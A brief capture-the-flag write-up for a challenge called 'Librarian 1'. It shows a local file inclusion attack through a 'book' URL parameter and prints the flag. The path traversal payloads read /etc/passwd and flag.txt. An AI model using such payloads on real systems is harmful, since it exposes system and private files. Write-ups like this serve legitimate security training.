# Librarian 1

The hint is:
```
Please, GET a book, such book1.txt  
```

So we can do: `?book=book1.txt`
And we get the content of the file.

So I tried and got an output for: `?book=../../../etc/passwd`
SO the next setp that got me the flag was: `?book=../../../flag.txt`

flag: `T43CTF{LocalFileInclusion_to_read_some_books}`